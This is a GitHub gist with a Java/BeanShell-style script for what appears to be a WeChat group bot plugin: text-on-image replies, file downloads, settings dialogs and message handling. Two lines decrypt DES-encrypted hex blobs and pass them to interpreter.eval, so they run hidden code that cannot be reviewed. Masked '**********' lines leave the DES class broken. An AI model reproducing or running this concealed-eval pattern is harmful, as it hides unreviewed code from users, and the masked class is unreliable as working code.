//date: 2025-05-19T16:50:56Z
//url: https://api.github.com/gists/4de6fa340f1e14c8373dc811ecad9b64
//owner: https://api.github.com/users/dlyl666

public static double ParseString(String version) {
    String[] parts = version.split("\\.");
    double result = 0;
    for (int i = 0; i < parts.length; i++) {
        String numericPart = parts[i].replaceAll("[^0-9]", "");
        if (!numericPart.isEmpty()) {
            int value = Integer.parseInt(numericPart);
            result += value * Math.pow(10, (parts.length - i - 1));
        }
    }
    return result;
}

public int getDuration(String source) {
    MediaMetadataRetriever retriever=new MediaMetadataRetriever();
    try {
        if(isUrl(source)) {
            URL url=new URL(source);
            retriever.setDataSource(url.toString());
        } else if(isFilePath(source)) {
            retriever.setDataSource(source);
        } else {
            return 1;
        }
        String time=retriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION);
        return Integer.parseInt(time);
    } catch (Exception e) {
        e.printStackTrace();
        return 1;
    }
}
public static void SendReply(long msgId, String qun, String text) {
    double version=ParseString(VersionName(HostInfo.getModuleContext()));
    double ber=ParseString("3.5.5");
    if(version>=ber) {
        sendReply(msgId,qun,text);
    } else {
        sendTextCard(qun,text);
    }
}
public static String multi(String str) {
    String result=post("https://suo.yt/short","longUrl="+str+"&shortKey=");
    try {
        JSONObject json=new JSONObject(result);
        Integer status=json.getInt("Code");
        if(status==1) {
            String url=json.getString("ShortUrl");
            return url;
        }
        return str;
    } catch (Throwable th) {
        return str;
    }
}
public static long timeUntilNext(int unit, int type) {
    LocalDateTime now=LocalDateTime.now();
    LocalDateTime targetTime;
    switch (unit) {
    case 1: // 周//剩天
        targetTime=now.withHour(0).withMinute(0).withSecond(0).withNano(0).plusWeeks(1);
        break;
    case 2: // 天/剩时
        targetTime=now.withHour(0).withMinute(0).withSecond(0).withNano(0).plusDays(1);
        break;
    case 3: // 时/剩分
        targetTime=now.withMinute(0).withSecond(0).withNano(0).plusHours(1);
        break;
    case 4: // 分/剩秒
        targetTime=now.withSecond(0).withNano(0).plusMinutes(1);
        break;
    default:
        targetTime=now.withSecond(0).withNano(0).plusMinutes(1);
    }
    Duration duration=Duration.between(now, targetTime);
    switch (type) {
    case 1: // 周/剩天
        return duration.toDays()/7;
    case 2: // 天/剩时
        return duration.toHours();
    case 3: // 时/剩分
        return duration.toMinutes();
    case 4: // 分/剩秒
        return duration.getSeconds();
    default:
        return duration.getSeconds();
    }
}
public static String VersionName(Context context) {
    try {
        return context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName;
    } catch (Exception e) {
        e.printStackTrace();
        return "";
    }
}
public static int VersionCode(Context context) {
    try {
        return context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionCode;
    } catch (Exception e) {
        e.printStackTrace();
        return -1;
    }
}
public static String AudioToSilk(String url) {
    if(!url.contains(".silk")) {
        String result=post("https://www.yx520.ltd/API/silk/api.php","url="+URLEncoder.encode(url,"UTF-8"));
        try {
            JSONObject json=new JSONObject(result);
            Integer code=json.getInt("code");
            if(code==1) {
                String message=json.getString("message");
                return message;
            } else {
                return "";
            }
        } catch(e) {
            return "";
        }
    }
    return url;
}
public static String formatTime(float time) {
    String suffix="豪秒";
    long seconds=(long)(time/1000);
    String tr=seconds/3600+"时"+(seconds%3600)/60+"分"+seconds%3600%60%60+"秒";
    tr=tr.replace("分0秒","分");
    tr=tr.replace("时0分","时");
    tr=tr.replace("0时","");
    return tr;
}
public static HashMap 地图=new HashMap();
public class 检查 {
    String 名称;
    JSONArray 数组;
    JSONArray 数据=new JSONArray();
    long 时间;
    int 数量;
}
Activity ThisActivity = null;
public void initActivity() {
    ThisActivity = getActivity();
}
public void ts(String Title, String Content) {
    initActivity();
    ThisActivity.runOnUiThread(new Runnable() {
        public void run() {
            AlertDialog alertDialog = new AlertDialog.Builder(ThisActivity,AlertDialog.THEME_DEVICE_DEFAULT_LIGHT).create();
            alertDialog.setTitle(Title);
            alertDialog.setMessage(Content);
            alertDialog.setCancelable(false);
            alertDialog.setButton(DialogInterface.BUTTON_NEGATIVE, "确定", new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {}
            });
            alertDialog.show();
        }
    });
}
public class CustomToast {
    private static Toast toast;
    private static Handler handler = new Handler(Looper.getMainLooper());
    public static void a(Context context,String str) {
        handler.post(new Runnable() {
            public void run() {
                if (toast != null) {
                    toast.cancel();
                }
                TextView textView = new TextView(context);
                textView.setBackground(n4("#181818", "#FFFFFF", 0, 10)); // 设置背景
                textView.setPadding(30, 30, 30, 30);
                textView.setTextColor(android.graphics.Color.WHITE); // 设置文本颜色为白色
                textView.setGravity(Gravity.CENTER); // 设置文本居中
                textView.setText("[PLCNB]\n" + str); // 设置文本内容
                toast = new Toast(context.getApplicationContext());
                toast.setGravity(Gravity.CENTER, 0, 0); // 设置Toast显示位置为屏幕中央
                toast.setDuration(Toast.LENGTH_LONG); // 设置Toast显示时长
                toast.setView(textView); // 设置Toast的视图
                toast.show(); // 显示Toast
            }
        });
    }
    public static android.graphics.drawable.GradientDrawable n4(String str, String str2, int i, int i2) {
        android.graphics.drawable.GradientDrawable gradientDrawable = new android.graphics.drawable.GradientDrawable();
        gradientDrawable.setColor(android.graphics.Color.parseColor(str));
        gradientDrawable.setStroke(i, android.graphics.Color.parseColor(str2));
        gradientDrawable.setCornerRadius(i2);
        gradientDrawable.setAlpha(130);
        gradientDrawable.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE); // 设置形状为矩形
        return gradientDrawable;
    }
}
public static String FileFormatConversion(long sizeInBytes) {
    double sizeInKB=sizeInBytes / 1024.0; // 文件夹大小（KB）
    DecimalFormat decimalFormat=new DecimalFormat("#.###");
    if (sizeInKB < 1024) {
        return decimalFormat.format(sizeInKB) + "KB";
    } else if (sizeInKB < 1024 * 1024) {
        double sizeInMB=sizeInKB / 1024.0; // 文件夹大小（MB）
        return decimalFormat.format(sizeInMB) + "MB";
    } else {
        double sizeInGB=sizeInKB / (1024.0 * 1024.0); // 文件夹大小（GB）
        return decimalFormat.format(sizeInGB) + "GB";
    }
}
int 选择=0;
public void 存(String a,String b,String c) {
    putString(a,b,c);
}
public String 取(String a,String b) {
    return getString(a,b,"");
}
public static long getDirectorySize(File dir) {
    if (dir == null || !dir.isDirectory()) {
       return 0;
    }
    long size = 0;
    File[] files = dir.listFiles();
    if (files != null) {
        for (File file : files) {
            if (file.isFile()) {
                size += file.length();
            } else if (file.isDirectory()) {
                 size += getDirectorySize(file); // 递归调用
            }
        }
    }
    return size;
}
boolean flag=false;
public List list=new ArrayList();
public static void DetectPic() {
    try {
        File dir = new File(JavaPath+"/数据/底图/");
        if(!dir.exists()||getDirectorySize(dir)==0) {
            dir.mkdirs();
            Downloadpic(-1);
        } else {
            for(int i=0; i<10; i++) {
                String fi=JavaPath+"/数据/底图/底图"+i+".jpg";
                File di = new File(fi);
                if(!di.exists()) {
                    Downloadpic(i);
                    if(list.contains(fi)) {
                        list.remove(fi);
                    }
                }
            }
        }
    } catch(Exception e) {
        e.printStackTrace();
    }
}
public static void Downloadpic(int j) {
    String url="https://api.miaomc.cn/image/get";
    if(j==-1) {
        flag=true;
        CustomToast.a(mContext,"底图正在缓存,请稍后");
        for(int i=0; i<10; i++) {
            try {
                xz(url,JavaPath+"/数据/底图/底图"+i+".jpg");
                if(i==9) {
                    flag=false;
                    CustomToast.a(mContext,"底图缓存成功");
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    } else {
        try {
            xz(url,JavaPath+"/数据/底图/底图"+j+".jpg");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
public static void getData(String qun,String text) {
    if(flag) {
        sendMsg(qun,text);
        CustomToast.a(mContext,"底图缓存中，暂时切换文字发送");
        return;
    }
    String textface=JavaPath+"/数据/字体.ttf";
    File ff=new File(textface);
    if(!ff.exists()) {
        String url="https://sfile.chatglm.cn/chatglm4/b55e86e7-3343-443c-a73d-36640717c9cf.ttf";
        sendMsg(qun,text);
        CustomToast.a(mContext,"字体下载中，暂时切换文字发送");
        xz(url,textface);
        CustomToast.a(mContext,"字体下载完成");
        return;
    }
    int num=(int)(Math.random()*10);
    String Path=JavaPath+"/数据/底图/底图"+num+".jpg";
    File directory = new File(Path);
    while(!directory.exists()) {
        DetectPic();
        num=(int)(Math.random()*10);
        Path=JavaPath+"/数据/底图/底图"+num+".jpg";
    }
    if(!list.contains(Path)) {
        try {
            long directorySize = directory.length();
            if (directorySize == 0) {
                getData(qun,text);
                delAllFile(directory,1);
                list.add(Path);
                DetectPic();
                return;
            }
            sendPic(qun,MakeTextPhoto(text,Path));
            delAllFile(directory,1);
            list.add(Path);
            DetectPic();
        } catch(Exception e) {
            CustomToast.a(mContext,"底图"+num+"错误,已删除并重新回调");
            delAllFile(directory,1);
            getData(qun,text);
            return;
        }
    } else {
        CustomToast.a(mContext,"太快了,请慢点");
        getData(qun,text);
    }
}
public static String fetchRedirectUrl(String url) {
    try {
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setInstanceFollowRedirects(false);
        conn.setConnectTimeout(5000);
        return conn.getHeaderField("Location");
    } catch (Exception e) {
        e.printStackTrace();
        return "";
    }
}
public final class MY {
    private final static String DES = "DES";
    public static String JM(String src, String key) {
        try {
            return new String(JM(hex2byte(src.getBytes()), key.getBytes()));
        } catch (Exception e)
        {}
        return null;
    }
    private static byte[] JM(byte[] src, byte[] key) throws Exception {
        SecureRandom sr = new SecureRandom();
        DESKeySpec dks = new DESKeySpec(key);
        SecretKeyFactory keyFactory = "**********"
        SecretKey securekey = "**********"
        Cipher cipher = Cipher.getInstance(DES);
        cipher.init(Cipher.DECRYPT_MODE, securekey, sr);
        return cipher.doFinal(src);
    }
    private static byte[] hex2byte(byte[] b) {
        if((b.length % 2) != 0) throw new IllegalArgumentException("长度不是偶数");
        byte[] b2 = new byte[b.length / 2];
        for(int n = 0; n < b.length; n += 2) {
            String item = new String(b, n, 2);
            b2[n / 2] = (byte) Integer.parseInt(item, 16);
        }
        return b2;
    }
    private static String byte2hex(byte[] b) {
        String hs = "";
        String stmp = "";
        for(int n = 0; n < b.length; n++) {
            stmp = (java.lang.Integer.toHexString(b[n] & 0XFF));
            if(stmp.length() == 1) hs = hs + "0" + stmp;
            else hs = hs + stmp;
        }
        return hs.toUpperCase();
    }
}
public static void xz(String url,String filepath) throws Exception {
    InputStream input = null;
    File file=new File(filepath);
    if(!file.getParentFile().exists()) {
        file.getParentFile().mkdirs();
        if(!file.exists()) {
            file.createNewFile();
        }
    }
    try {
        URL urlsssss = new URL(url);
        HttpURLConnection urlConn = (HttpURLConnection) urlsssss.openConnection();
        input = urlConn.getInputStream();
        byte[] bs = new byte[1024];
        int len;
        FileOutputStream out = new FileOutputStream(filepath, false);
        while((len = input.read(bs)) != -1) {
            out.write(bs, 0, len);
        }
        out.close();
        input.close();

    } catch (IOException e) {
        return;
    } finally {
        try {
            input.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    return;
}
private static void downloadFile(String url, String outputPath) throws IOException {
        InputStream input = null;
        FileOutputStream output = null;
        try {
            URL urls = new URL(url);
            HttpURLConnection urlConn = (HttpURLConnection) urls.openConnection();
            input = urlConn.getInputStream();
            output = new FileOutputStream(outputPath);

            byte[] bs = new byte[1024];
            int len;
            while ((len = input.read(bs)) != -1) {
                output.write(bs, 0, len);
            }
        } finally {
            if (output != null) {
                output.close();
            }
            if (input != null) {
                input.close();
            }
        }
    }

private MediaPlayer mediaPlayer;
public void 提示音(Context context, String pathOrUrl) {
        if (mediaPlayer == null) {
            mediaPlayer = new MediaPlayer();
        }
        try {
            mediaPlayer.reset();
            if (isFilePath(pathOrUrl)) {
                mediaPlayer.setDataSource(pathOrUrl);
            } else {
                Uri uri = Uri.parse(pathOrUrl);
                mediaPlayer.setDataSource(context, uri);
            }
            mediaPlayer.prepare();
            mediaPlayer.start();
        } catch (Exception e) {
            e.printStackTrace();
            releaseMediaPlayer();
        }
    }
public void releaseMediaPlayer() {
    if (mediaPlayer != null) {
        try {
            if (mediaPlayer.isPlaying()) {
                mediaPlayer.stop();
            }
            mediaPlayer.release();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        mediaPlayer = null;
    }
}
this.interpreter.eval(MY.JM("9c15a243e4cb5ebe8e8d2738ad5c5ee61a7b68d09cfd5533b7ab6302331c09cc262ef4f35dc65b420191626bb772daafba56449200d485c65b5f630a91722240b12f07c3e50387448b1e9686cde593ab0c6823c76c82036dda6f8efbaf78fee0413555f9513e1c7127a67773022f9c78659c30ad60c6c6eeb25b3b62b1fa408fa733d1f3b9b86020","SecretKey"),"eval stream");
public static String MakeTextPhoto(String text,String pic) {
    String textface=JavaPath+"/数据/字体.ttf";
    Object typeface;
    try {
        typeface=Typeface.createFromFile(textface);
    } catch(e) {
        typeface=Typeface.DEFAULT_BOLD;
    }
    text=text.replace("[]","");
    String[] word=text.split("\n");
    float textsize=65.0f;
    float padding=55.0f;
    Paint paint=new Paint(Paint.ANTI_ALIAS_FLAG | Paint.DITHER_FLAG);
    paint.setTypeface(typeface);
    paint.setTextSize(textsize);
    Bitmap mybitmap;
    if(isFilePath(pic)) {
        mybitmap=BitmapFactory.decodeFile(pic);
    } else {
        URL imageUrl=new URL(pic);
        HttpURLConnection con=(HttpURLConnection)imageUrl.openConnection();
        con.setDoInput(true);
        con.connect();
        InputStream input=con.getInputStream();
        mybitmap=BitmapFactory.decodeStream(input);
    }
    float text_width=0;
    float average_width=0;
    float text_height=0;
    String newword="";
    for(String line:word) {
        average_width +=paint.measureText(line);
    }
    average_width=average_width/word.length;
    for(String line:word) {
        float width=paint.measureText(line);
        if(width-average_width>700) {
            int rr=Math.ceil(width/average_width);
            int cut=Math.ceil(line.length()/rr);

            line=splitString(line,cut);
            for(String newl:line.split("\n")) {
                width=paint.measureText(newl);
                if(text_width<width) text_width=width;
            }
        }
        if(text_width<width) text_width=width;
        newword+=line+"\n";
    }
    word=newword.split("\n");
    int width=(int)(text_width + padding * 2f);
    int heigth=(int)((textsize+8) * word.length+ padding * 2f)-8;
    Bitmap original=Bitmap.createBitmap(width, heigth, Bitmap.Config.ARGB_8888);
    Canvas canvas=new Canvas(original);
    Matrix matrix = new Matrix();
    float i=(float)width/(float)mybitmap.getWidth();
    float b=(float)heigth/(float)mybitmap.getHeight();
    if(i>b) b=i;
    //if(i<b) b=i;
    matrix.postScale(b,b); //长和宽放大缩小的比例
    Bitmap resizeBmp = Bitmap.createBitmap(mybitmap,0,0,mybitmap.getWidth(),mybitmap.getHeight(),matrix,true);
    canvas.drawBitmap(resizeBmp, (original.getWidth()-resizeBmp.getWidth())/2, (original.getHeight()-resizeBmp.getHeight())/2, paint);
    canvas.drawColor(Color.parseColor("#5AFFFFFF"));//白色半透明遮罩
    float yoffset=textsize+padding;
    String[] colors = {"黑色"};
    //字体颜色可填：红色、黑色、蓝色、蓝绿、白灰、灰色、绿色、深灰、洋红、透明、白色、黄色、随机
    String 菜单名字="";
    if(!取("开关","菜单名字").equals("")) {
        菜单名字=取("开关","菜单名字");
    }
    for(int i=0;i<word.length;i++) {
        if(i==0) {
            if(菜单名字.equals("-")) {
                paint.setColor(getColor(colors[i%(colors.length)]));
            } else paint.setColor(getColor("红色"));
        } else {
            paint.setColor(getColor(colors[i%(colors.length)]));
        }
        canvas.drawText(word[i],padding,yoffset,paint);
        yoffset+=textsize+8;
    }
    String path=JavaPath+"/缓存/图片/"+canvas+".png";
    File end=new File(path);
    if(!end.exists()) end.getParentFile().mkdirs();
    FileOutputStream out=new FileOutputStream(end);
    original.compress(Bitmap.CompressFormat.JPEG, 100, out);
    out.close();
    return path;
}
private static String randomColor(int len) {
    try {
        StringBuffer result=new StringBuffer();
        for (int i=0; i < len; i++) {
            result.append(Integer.toHexString(new Random().nextInt(16)));
        }
        return result.toString().toUpperCase();
    } catch (Exception e) {
        return "00CCCC";
    }
};
public static int getColor(String color) {
    switch(color) {
    case "红色":
        return Color.RED;
    case "黑色":
        return Color.BLACK;
    case "蓝色":
        return Color.BLUE;
    case "蓝绿":
        return Color.CYAN;
    case "白灰":
        return Color.LTGRAY;
    case "灰色":
        return Color.GRAY;
    case "绿色":
        return Color.GREEN;
    case "深灰":
        return Color.DKGRAY;
    case "洋红":
        return Color.MAGENTA;
    case "透明":
        return Color.TRANSPARENT;
    case "白色":
        return Color.WHITE;
    case "黄色":
        return Color.YELLOW;
    case "随机":
        return Color.parseColor("#"+randomColor(6));
    default:
        return Color.parseColor("#"+color);
    }
};
public Object ParseColor(String color,Object normal) {
    Object parsecolor;
    try {
        if(color.contains("随机")) parsecolor=Color.parseColor(randomColor(6));
        else parsecolor=Color.parseColor(color);
    } catch(e) {
        parsecolor=normal;
    }
    return parsecolor;
}
public String splitString(String content, int len) {
    String tmp="";
    if(len > 0) {
        if(content.length() > len) {
            int rows=Math.ceil(content.length() / len);
            for (int i=0; i < rows; i++) {
                if(i == rows - 1) {
                    tmp += content.substring(i * len);
                } else {
                    tmp += content.substring(i * len, i * len + len) + "\n ";
                }
            }
        } else {
            tmp=content;
        }
    }
    return tmp;
}
this.interpreter.eval(MY.JM("063ff10c908efb729b08fae97a1f001d78f5fde433f09c71f81ea8b5c827855ac2545369ad9164cc5bf150006a0f6af6","SecretKey"),"eval stream");
//获取目录大小
public static String getFormattedSize(File folder) {
    if (folder == null || !folder.exists()) {
        return "文件夹不存在或为空";
    }
    long sizeInBytes=getFolderSize(folder);
    double sizeInKB=sizeInBytes / 1024.0; // 文件夹大小（KB）
    DecimalFormat decimalFormat=new DecimalFormat("#.###");
    if (sizeInKB < 1024) {
        return decimalFormat.format(sizeInKB) + "KB";
    } else if (sizeInKB < 1024 * 1024) {
        double sizeInMB=sizeInKB / 1024.0; // 文件夹大小（MB）
        return decimalFormat.format(sizeInMB) + "MB";
    } else {
        double sizeInGB=sizeInKB / (1024.0 * 1024.0); // 文件夹大小（GB）
        return decimalFormat.format(sizeInGB) + "GB";
    }
}
public static long getFolderSize(File folder) {
    long size=0;
    File[] files=folder.listFiles();
    if (files != null) {
        for (File file : files) {
            if (file.isFile()) {
                size += file.length();
            } else if (file.isDirectory()) {
                size += getFolderSize(file);
            }
        }
    }
    return size;
}
delAllFile(new File(JavaPath+"/缓存"),0);
public static String u加(String str) {
    String r="";
    for (int i=0; i < str.length(); i++) {
        int chr1=(char) str.charAt(i);
        String x=""+Integer.toHexString(chr1);
        if(x.length()==1)r+= "\\u000"+x;
        if(x.length()==2)r+= "\\u00"+x;
        if(x.length()==3)r+= "\\u0"+x;
        if(x.length()==4)r+= "\\u"+x;
    }
    return r;
}
public static String u解(String unicode) {
    StringBuffer string = new StringBuffer();
    String[] hex = unicode.split("\\\\u");
    for (int i = 0; i < hex.length; i++) {
        try {
            if(hex[i].length()>=4) {
                String chinese = hex[i].substring(0, 4);
                try {
                    int chr = Integer.parseInt(chinese, 16);
                    boolean isChinese = isChinese((char) chr);
                    string.append((char) chr);
                    String behindString = hex[i].substring(4);
                    string.append(behindString);
                } catch (NumberFormatException e1) {
                    string.append(hex[i]);
                }

            } else {
                string.append(hex[i]);
            }
        } catch (NumberFormatException e) {
            string.append(hex[i]);
        }
    }
    return string.toString();
}
public static boolean isChinese(char c) {
    Character.UnicodeBlock ub = Character.UnicodeBlock.of(c);
    if (ub == Character.UnicodeBlock.CJK_UNIFIED_IDEOGRAPHS
            || ub == Character.UnicodeBlock.CJK_COMPATIBILITY_IDEOGRAPHS
            || ub == Character.UnicodeBlock.CJK_UNIFIED_IDEOGRAPHS_EXTENSION_A
            || ub == Character.UnicodeBlock.GENERAL_PUNCTUATION
            || ub == Character.UnicodeBlock.CJK_SYMBOLS_AND_PUNCTUATION
            || ub == Character.UnicodeBlock.HALFWIDTH_AND_FULLWIDTH_FORMS) {
        return true;
    }
    return false;
}
public void onMsg(Object data) {
    String text=data.content;
    String qun=data.talker;
    String wxid=data.sendTalker;
    if("1".equals(getString("开关","私聊播报",""))) {
        播报(data);
    }
    if(!HList.contains(mWxid)) {
        if(data.isFile()||data.isText()||data.isReply()||data.isCard()) {
            if(mWxid.equals(wxid)) {
                YunJava(data);
            }
            if("1".equals(getString(qun,"开关",""))) {
                for(String Yun:getGroups()) {
                    if(Arrays.asList(YunJava).contains(Yun)||BList.contains(mWxid)||BList.contains(Yun)) { 
                        boolean start=yun.getBoolean("start");
                        try {
                            if(start) {
                                菜单(data);
                                if(data.talkerType==0) {
                                    回复(data);
                                }
                            }
                        } catch (Exception e) {
                            if(data.type!=16777265) {
                                Toast("["+脚本名称+"]出现错误\n"+e.getMessage());
                                if(text.equals("")) {
                                    text="";
                                } else {
                                    text="发送\""+text+"\"时\n";
                                }
                                sendTextCard(mWxid,"["+脚本名称+"]"+text+e.getMessage());
                            }
                        }
                        break;
                    }
                }
            }
        }
        if("1".equals(getString(qun,"开关",""))) {
            消息(data);
            进群(data);
            if("1".equals(getString(qun,"自身撤回",""))) {
                int 撤回时间 = 30;
                if(getInt(qun,"撤回时间",0) != null) {
                    撤回时间 = getInt(qun,"撤回时间",30);
                }
                Handler handler = new Handler(Looper.getMainLooper());
                handler.postDelayed(new Runnable() {
                    public void run() {
                        if(wxid.equals(mWxid)) {
                            recallMsg(data.msgId);
                        }
                    }
                }, 撤回时间*1000);
            }
        }
    }
}
public void YunJava(Object data) {
    String text=data.content;
    String qun=data.talker;
    String wxid=data.sendTalker;
    if(text.equals("开机")||text.equals("开启")) {
        if(!Arrays.asList(YunJava).contains(qun)&&!HList.contains(qun)||mWxid.equals(AuthorWxid)) {
            if("1".equals(getString(qun,"开关",""))) {
                sendMsg(qun,"已经开机了");
            } else {
                putString(qun,"开关","1");
                sendMsg(qun,"已开机");
            }
        } else {
            CustomToast.a(mContext,"已被拦截");
            sendMsg(mWxid,"\""+getName(qun)+"\"已被拦截");
        }
    }
    if(text.equals("关机")||text.equals("关闭")) {
        if("1".equals(getString(qun,"开关",""))) {
            putString(qun,"开关",null);
            sendMsg(qun,"已关机");
        }
    }
    if(text.equals("所有群设置")||text.equals("所有群开关")) {
        所有群设置();
        recallMsg(data.msgId);
    }
    if(text.equals("开关设置")||text.equals("设置开关")) {
        if(!Arrays.asList(YunJava).contains(qun)&&!HList.contains(qun)||mWxid.equals(AuthorWxid)) {
            开关设置(qun);
            recallMsg(data.msgId);
        } else {
            CustomToast.a(mContext,"已被拦截");
            sendMsg(mWxid,"\""+getName(qun)+"\"已被拦截");
        }
    }
    if(text.equals("配置设置")||text.equals("设置配置")) {
        配置设置(qun);
        recallMsg(data.msgId);
    }
}
boolean found=false;
for(String Yun:getGroups()) {
    if(Arrays.asList(YunJava).contains(Yun)||BList.contains(mWxid)||BList.contains(Yun)) {
        found=true;
        break;
    }
}
public void 配置设置(String qun) {
    initActivity();
    boolean 底部时间=true;
    boolean 底部文案=true;
    boolean 底部尾巴=true;
    boolean 私聊播报=true;
    if(!取("开关","底部时间").equals("1")) {
        底部时间=false;
    }
    if(!取("开关","底部文案").equals("1")) {
        底部文案=false;
    }
    if(!取("开关","底部尾巴").equals("1")) {
        底部尾巴=false;
    }
    if(!取("开关","私聊播报").equals("1")) {
        私聊播报=false;
    }
    ThisActivity.runOnUiThread(new Runnable() {
        public void run() {
            AlertDialog.Builder tx=new AlertDialog.Builder(ThisActivity, AlertDialog.THEME_DEVICE_DEFAULT_LIGHT);
            String[] ww= {"底部时间","底部文案","底部尾巴","私聊播报"};
            boolean[] xx= {底部时间,底部文案,底部尾巴,私聊播报};
            TextView tc = new TextView(ThisActivity);
            tc.setText(Html.fromHtml("<font color=\"#D0ACFF\">菜单名字</font>"));
            tc.setTextSize(20);
            TextView tc1 = new TextView(ThisActivity);
            tc1.setText(Html.fromHtml("<font color=\"#71CAF8\">菜单指令</font>"));
            tc1.setTextSize(20);
            TextView tc2 = new TextView(ThisActivity);
            tc2.setText(Html.fromHtml("<font color=\"#21E9FF\">发送模式</font>"));
            tc2.setTextSize(20);
            TextView tc3 = new TextView(ThisActivity);
            tc3.setText(Html.fromHtml("<font color=\"#E09C4F\">手机号码</font>"));
            tc3.setTextSize(20);
            final EditText editText = new EditText(ThisActivity);
            editText.setHint(Html.fromHtml("<font color=\"#A2A2A2\">不填则默认,填\"-\"无标题</font>"));
            editText.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
            editText.addTextChangedListener(new TextWatcher() {
                public void beforeTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
                public void onTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
                public void afterTextChanged(Editable editable) {
                    int inputLength = editable.length();
                    if (inputLength>15) {
                        String limitedText = editable.toString().substring(0,15);
                        editText.setText(limitedText);
                        editText.setSelection(limitedText.length());
                    }
                }
            });
            editText.setText(取("开关","菜单名字"));
            final EditText editText1=new EditText(ThisActivity);
            editText1.setHint(Html.fromHtml("<font color=\"#A2A2A2\">不填则默认</font>"));
            editText1.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
            editText1.addTextChangedListener(new TextWatcher() {
                public void beforeTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
                public void onTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
                public void afterTextChanged(Editable editable) {
                    int inputLength = editable.length();
                    if (inputLength>10) {
                        String limitedText = editable.toString().substring(0,10);
                        editText1.setText(limitedText);
                        editText1.setSelection(limitedText.length());
                    }
                }
            });
            editText1.setText(取("开关","菜单指令"));
            final EditText editText2=new EditText(ThisActivity);
            editText2.setHint(Html.fromHtml("<font color=\"#A2A2A2\">不填则默认文字 1图片 2卡片</font>"));
            editText2.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
            editText2.setInputType(InputType.TYPE_CLASS_NUMBER);
            editText2.addTextChangedListener(new TextWatcher() {
                public void beforeTextChanged(CharSequence s,int start,int count,int after) {}
                public void onTextChanged(CharSequence s,int start,int before,int count) {
                    if(!s.toString().matches("[1-2]")) {
                        editText2.getText().delete(editText2.length()-1, editText2.length());
                    }
                }
                public void afterTextChanged(Editable s) {}
            });
            editText2.setText(取("开关","发送模式"));
            final EditText editText3=new EditText(ThisActivity);
            editText3.setHint(Html.fromHtml("<font color=\"#A2A2A2\">请输入手机号码</font>"));
            editText3.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
            editText3.setInputType(InputType.TYPE_CLASS_NUMBER);
            editText3.addTextChangedListener(new TextWatcher() {
                public void beforeTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
                public void onTextChanged(CharSequence charSequence,int i,int i1,int i2) {}
                public void afterTextChanged(Editable editable) {
                    int inputLength = editable.length();
                    if (inputLength>11) {
                        String limitedText = editable.toString().substring(0,11);
                        editText3.setText(limitedText);
                        editText3.setSelection(limitedText.length());
                    }
                }
            });
            String phoneNumber=取("开关","手机号码");
            if (phoneNumber.length() > 7) {
                phoneNumber=phoneNumber.substring(0,3)+"******"+phoneNumber.substring(9);
            }
            editText3.setText(phoneNumber);
            LinearLayout cy=new LinearLayout(ThisActivity);
            cy.setOrientation(LinearLayout.VERTICAL);
            cy.addView(tc);
            cy.addView(editText);
            cy.addView(tc1);
            cy.addView(editText1);
            cy.addView(tc2);
            cy.addView(editText2);
            cy.addView(tc3);
            cy.addView(editText3);
            tx.setTitle(Html.fromHtml("<font color=\"red\">配置设置</font>"));
            tx.setView(cy);
            tx.setPositiveButton(Html.fromHtml("<font color=\"#893BFF\">确认</font>"),new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialogInterface,int i) {
                    String tx=editText.getText().toString();
                    String tx1=editText1.getText().toString();
                    String tx2=editText2.getText().toString();
                    String tx3=editText3.getText().toString();
                    boolean[] cs=xx;
                    if(cs[0]) {
                        存("开关", "底部时间","1");
                    } else {
                        存("开关", "底部时间",null);
                    }
                    if(cs[1]) {
                        存("开关", "底部文案","1");
                    } else {
                        存("开关", "底部文案",null);
                    }
                    if(cs[2]) {
                        存("开关", "底部尾巴","1");
                    } else {
                        存("开关", "底部尾巴",null);
                    }
                    if(cs[3]) {
                        存("开关", "私聊播报","1");
                    } else {
                        存("开关", "私聊播报",null);
                    }
                    if(!tx3.equals("")) {
                        if(!tx3.contains("*")) {
                            存("开关","手机号码",tx3);
                        }
                    } else {
                        存("开关","手机号码",null);
                    }
                    if(!tx2.equals("")) {
                        存("开关","发送模式",tx2);
                    } else {
                        存("开关","发送模式",null);
                    }
                    if(!tx1.equals("")) {
                        存("开关","菜单指令",tx1);
                    } else {
                        存("开关","菜单指令",null);
                    }
                    if(!tx.equals("")) {
                        存("开关","菜单名字",tx);
                    } else {
                        存("开关","菜单名字",null);
                    }
                    CustomToast.a(mContext,"设置成功");
                }
            });
            tx.setNegativeButton(Html.fromHtml("<font color=\"#E3319D\">取消</font>"),new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialogInterface,int i) {
                }
            });
            tx.setMultiChoiceItems(ww,xx,new DialogInterface.OnMultiChoiceClickListener() {
                public void onClick(DialogInterface dialogInterface,int which,boolean isChecked) {
                    xx[which]=isChecked;
                }
            });
            tx.setCancelable(false);
            tx.show();
        }
    });
}
public static boolean isFilePath(String str) {
    File file = new File(str);
    return file.exists()&&file.canRead();
}
public static boolean isUUID(String str) {
    return str != null && str.matches("[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}");
}
public static boolean isXML(String text) {
        try {
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            DocumentBuilder builder = factory.newDocumentBuilder();
